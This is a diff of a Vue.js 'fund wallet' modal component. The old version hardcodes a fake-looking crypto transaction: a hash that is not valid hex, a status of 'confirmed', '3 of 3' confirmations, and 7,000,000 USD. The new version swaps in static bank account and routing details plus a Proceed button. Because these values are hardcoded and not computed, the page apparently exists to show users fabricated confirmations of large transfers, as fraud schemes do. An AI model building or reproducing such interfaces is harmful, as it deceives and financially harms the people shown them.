@@ -9,43 +9,53 @@
           <i class='bx bx-x' @click="close"></i>
         </div>
         <form @submit.prevent="checkAmount" class="second-part">
+          <br/>
           <div class="separate">
-            <input type="checkbox" disabled />
+<!--            <input type="checkbox" disabled />-->
             <p class="text-3">
-              Transaction Hash : 0x186fdefc2952480f6739b7a30d5028c<br/>b1pc8497412edc9f99cec25c05c86df54
+              <span>Account Name</span> : M & H Ideas, Inc.
             </p>
           </div>
 
           <hr/>
 
           <div class="separate">
-            <input type="checkbox" checked />
+<!--            <input type="checkbox" disabled />-->
             <p class="text-3">
-              Status : <span class="status-3">confirmed</span>
+             <span>Account Number</span> : 1391 0565 6262
             </p>
           </div>
 
 
-            <p class="text-5">
-              Confirmation : 3 of 3
-            </p>
+<!--          <p class="text-5">-->
+<!--            Confirmation : 3 of 3-->
+<!--          </p>-->
 
 
           <hr/>
 
           <div class="separate">
-            <input type="checkbox" checked  />
+<!--            <input type="checkbox" disabled  />-->
             <p class="text-3">
-              Block : <span class="status-3">Blocks completed</span>
+              <span>Bank Address</span> : Bank of America; 1801 16th St Mall; Denver, CO; 80202; United States
             </p>
           </div>
 
           <hr/>
 
           <div class="separate">
-            <input type="checkbox" checked />
+<!--            <input type="checkbox" disabled />-->
             <p class="text-3">
-              Amount : <span class="status-2">7,000,000 USD</span>
+              <span>Bank ABA/SWIFT Code</span> : 026009593
+            </p>
+          </div>
+
+          <hr/>
+
+          <div class="separate">
+                        <input type="checkbox"  />
+            <p class="text-3">
+              Verify Account Details
             </p>
           </div>
 
@@ -69,31 +79,31 @@
 
           <!--          <hr/>-->
 
-<!--          <div class="input-button-wrapper">-->
-<!--            <div>-->
-<!--              <label>Destination wallet</label>-->
-<!--            </div>-->
-<!--            <input type="text" required v-model="destinationWalletAddress"  class="text-input"-->
-<!--                   placeholder="Kindly enter wallet address"-->
-<!--            />-->
-<!--            &lt;!&ndash;            <button  class="submit-button" @click="copyText">Copy</button>&ndash;&gt;-->
-<!--          </div>-->
+          <!--          <div class="input-button-wrapper">-->
+          <!--            <div>-->
+          <!--              <label>Destination wallet</label>-->
+          <!--            </div>-->
+          <!--            <input type="text" required v-model="destinationWalletAddress"  class="text-input"-->
+          <!--                   placeholder="Kindly enter wallet address"-->
+          <!--            />-->
+          <!--            &lt;!&ndash;            <button  class="submit-button" @click="copyText">Copy</button>&ndash;&gt;-->
+          <!--          </div>-->
 
-<!--          <div class="input-button-wrapper">-->
-<!--            <div>-->
-<!--              <label>Amount (BTC)</label>-->
-<!--            </div>-->
-<!--            <input type="text" required v-model="payOutAmount"  class="text-input"-->
-<!--                   placeholder="Enter Pay Out Amount in BTC"-->
-<!--            />-->
-                      <button @click="close"  class="submit-button">Okay</button>
-<!--          </div>-->
+          <!--          <div class="input-button-wrapper">-->
+          <!--            <div>-->
+          <!--              <label>Amount (BTC)</label>-->
+          <!--            </div>-->
+          <!--            <input type="text" required v-model="payOutAmount"  class="text-input"-->
+          <!--                   placeholder="Enter Pay Out Amount in BTC"-->
+          <!--            />-->
+          <!--            &lt;!&ndash;            <button  class="submit-button">Copy</button>&ndash;&gt;-->
+          <!--          </div>-->
 
 
-<!--          <div class="input-button-wrapper">-->
-<!--            &lt;!&ndash;            <p class="text-fiat">Fiat amount: $8,004,409.2 | 1 BTC = {{bitcoinRate}}</p>&ndash;&gt;-->
-<!--            <p class="text-fiat">Fiat amount: $8,004,409.2 | 89.14 BTC</p>-->
-<!--          </div>-->
+          <!--          <div class="input-button-wrapper">-->
+          <!--            &lt;!&ndash;            <p class="text-fiat">Fiat amount: $8,004,409.2 | 1 BTC = {{bitcoinRate}}</p>&ndash;&gt;-->
+          <!--            <p class="text-fiat">Fiat amount: $8,004,409.2 | 89.14 BTC</p>-->
+          <!--          </div>-->
 
 
 
@@ -101,8 +111,7 @@
           <!--            <p class="loader-text" >Awaiting Payment</p>-->
           <!--            <span class="loader"></span>-->
           <!--          </div>-->
-
-<!--          <button class="submit-button" >Proceed</button>-->
+          <button class="submit-button" >Proceed</button>
 
         </form>
 
@@ -122,7 +131,7 @@ import {mapState} from "vuex";
 import Swal from "sweetalert2";
 
 export default {
-  name: "FundWalletModal6",
+  name: "FundWalletModal7",
   emits: ['close', 'open'],
   // components: {VueQrcode},
   computed: {
@@ -260,7 +269,6 @@ export default {
 }
 </script>
 
-
 <style scoped >
 
 .backdrop {
@@ -292,7 +300,7 @@ dialog {
   display: block;
   overflow: hidden;
   width: 420px;
-  height: 500px;
+  height: 530px;
   /*height: auto;*/
   padding: 24px;
   border-radius: 5px;
@@ -426,7 +434,7 @@ button{
 
 
 .submit-button {
-  padding: 8px 30px;
+  padding: 8px 25px;
   font-size: 16px;
   background-color: #007bff;
   color: white;
